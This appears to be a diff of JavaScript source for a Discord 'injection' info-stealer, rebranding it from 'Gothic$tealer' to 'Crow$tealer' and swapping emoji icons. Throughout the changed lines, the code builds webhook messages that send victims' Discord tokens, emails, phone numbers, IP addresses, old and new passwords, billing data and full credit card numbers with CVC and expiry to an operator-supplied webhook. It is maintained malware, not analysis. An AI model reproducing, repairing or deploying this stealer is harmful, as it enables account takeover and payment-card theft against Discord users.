@@ -10,7 +10,7 @@ const fs = require("fs");
 
 
 var config = {
-    brand: "Gothic",
+    brand: "Crow",
 
     webhook: "%WEBHOOK%",
 
@@ -22,9 +22,9 @@ var config = {
     ping: [true, "@everyone"],
 
     embed: {
-        username: "Gothic$tealer - Discord Injection 👀",
+        username: "Crow$tealer | Injection",
         footer: {
-            text: `@Gothic$tealer 🏴‍☠️`,
+            text: `@crow$tealer`,
         },
     },
 
@@ -269,25 +269,25 @@ var event_handlers = {
                         inline: false
                     },
                     {
-                        name: "<:nitro:1101786103947731004> Nitro",
+                        name: "<:xans_skull:1177591010793107456> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<:gothic:1198627767055564800> Billing",
+                        name: "<:crow:1188957067835355177> Billing",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "<:badges:1101786069999026278> Badges",
+                        name: "<:xans_black:1177591009274769448> Badges",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<:ip:1101786086541365308> IP Adress",
+                        name: "<:black_crown:1177589323667865730> IP Adress",
                         value: `\`\`\`${network_data['ip'] ?? "Unknown"}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198627765549809674> Phone Number",
+                        name: "<:devil_heart_black:1177591014786093177> Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                         inline: true
                     },
@@ -297,7 +297,7 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198667998240714832> Credit card",
+                        name: "<:blackstar:1177587935869161483> Credit card",
                         value: `\`${number}|${cvc}|${month}/${year}\``,
                         inline: false
                     },
@@ -340,30 +340,30 @@ var event_handlers = {
                     inline: false
                     },
                     {
-                        name: "<:nitro:1101786103947731004> Nitro",
+                        name: "<:xans_skull:1177591010793107456> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<:gothic:1198627767055564800> Billing",
+                        name: "<:crow:1188957067835355177> Billing",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "<:badges:1101786069999026278> Badges",
+                        name: "<:xans_black:1177591009274769448> Badges",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<a:gothic:1189286875991646228> Email",
+                        name: "<:blackstar:1177587935869161483> Email",
                         value: `\`${email}\``,
                         inline: true
                     },
                     {
-                        name: "<:ip:1101786086541365308> IP Adress",
+                        name: "<:black_crown:1177589323667865730> IP Adress",
                         value: `\`\`\`${network_data['ip'] ?? "Unknown"}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198627765549809674> Phone Number",
+                        name: "<:devil_heart_black:1177591014786093177> Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                         inline: true
                     },
@@ -373,7 +373,7 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198667998240714832> Password",
+                        name: "Password",
                         value: `\`${password}\``,
                         inline: true
                     },
@@ -414,25 +414,25 @@ var event_handlers = {
                     inline: false
                     },
                     {
-                        name: "<:nitro:1101786103947731004> Nitro",
+                        name: "<:xans_skull:1177591010793107456> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<:gothic:1198627767055564800> Billing",
+                        name: "<:crow:1188957067835355177> Billing",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "<:badges:1101786069999026278> Badges",
+                        name: "<:xans_black:1177591009274769448> Badges",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<:ip:1101786086541365308> IP Adress",
+                        name: "<:black_crown:1177589323667865730> IP Adress",
                         value: `\`\`\`${network_data['ip'] ?? "Unknown"}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198627765549809674> Phone Number",
+                        name: "<:devil_heart_black:1177591014786093177> Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                         inline: true
                     },
@@ -442,12 +442,12 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<a:gothic:1189286875991646228> New email",
+                        name: "<:blackstar:1177587935869161483> New email",
                         value: `\`${newEmail}\``,
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198627767055564800> Password",
+                        name: "<:crow:1188957067835355177> Password",
                         value: `\`${password}\``,
                         inline: true
                     },
@@ -488,25 +488,25 @@ var event_handlers = {
                         inline: false
                     },
                     {
-                        name: "<:nitro:1101786103947731004> Nitro",
+                        name: "<:xans_skull:1177591010793107456> Nitro",
                         value: `${getNitro(userInfo.premium_type)}`,
                         inline: true
                     }, {
-                        name: "<:gothic:1198627767055564800> Billing",
+                        name: "<:crow:1188957067835355177> Billing",
                         value: `${billing}`,
                         inline: true
                     }, {
-                        name: "<:badges:1101786069999026278> Badges",
+                        name: "<:xans_black:1177591009274769448> Badges",
                         value: `${getBadges(userInfo.flags)}`,
                         inline: true
                     },
                     {
-                        name: "<:ip:1101786086541365308> IP Adress",
+                        name: "<:black_crown:1177589323667865730> IP Adress",
                         value: `\`\`\`${network_data['ip'] ?? "Unknown"}\`\`\``,
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198627765549809674> Phone Number",
+                        name: "<:devil_heart_black:1177591014786093177> Phone Number",
                         value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                         inline: true
                     },
@@ -516,12 +516,12 @@ var event_handlers = {
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198667998240714832> Old password",
+                        name: "<:blackstar:1177587935869161483> Old password",
                         value: `\`${oldPassword}\``,
                         inline: true
                     },
                     {
-                        name: "<:gothic:1198667998240714832> New password",
+                        name: "<:blackstar:1177587935869161483> New password",
                         value: `\`${newPassword}\``,
                         inline: true
                     },
@@ -742,29 +742,29 @@ async function initialize() {
                                 inline: false
                             },
                             {
-                                name: "<:nitro:1101786103947731004> Nitro",
+                                name: "<:xans_skull:1177591010793107456> Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
                                 inline: true
                             }, {
-                                name: "<:gothic:1198627767055564800> Billing",
+                                name: "<:crow:1188957067835355177> Billing",
                                 value: `${billing}`,
                                 inline: true
                             }, {
-                                name: "<:badges:1101786069999026278> Badges",
+                                name: "<:xans_black:1177591009274769448> Badges",
                                 value: `${getBadges(userInfo.flags)}`,
                                 inline: true
                             },{
-                                name: "<a:gothic:1189286875991646228> Email",
+                                name: "<:blackstar:1177587935869161483> Email",
                                 value: `\`${userInfo.email}\``,
                                 inline: true
                             },
                             {
-                                name: "<:ip:1101786086541365308> IP Adress",
+                                name: "<:black_crown:1177589323667865730> IP Adress",
                                 value: `\`\`\`${network_data['ip'] ?? "Unknown"}\`\`\``,
                                 inline: true
                             },
                             {
-                                name: "<:gothic:1198627765549809674> Phone Number",
+                                name: "<:devil_heart_black:1177591014786093177> Phone Number",
                                 value: `\`\`\`${userInfo.phone ?? "None"}\`\`\``,
                                 inline: true
                             },
@@ -807,15 +807,15 @@ async function initialize() {
                                 value: `\`${token}\``,
                                 inline: false
                             },{
-                                name: "<:gothic:1198667998240714832> Nitro",
+                                name: "<:blackstar:1177587935869161483> Nitro",
                                 value: `${getNitro(userInfo.premium_type)}`,
                                 inline: true
                             }, {
-                                name: "<:gothic:1198627767055564800> Billing",
+                                name: "<:crow:1188957067835355177> Billing",
                                 value: `${billing}`,
                                 inline: true
                             }, {
-                                name: "<:badges:1101786069999026278> Badges",
+                                name: "<:xans_black:1177591009274769448> Badges",
                                 value: `${getBadges(userInfo.flags)}`,
                                 inline: true
                             },
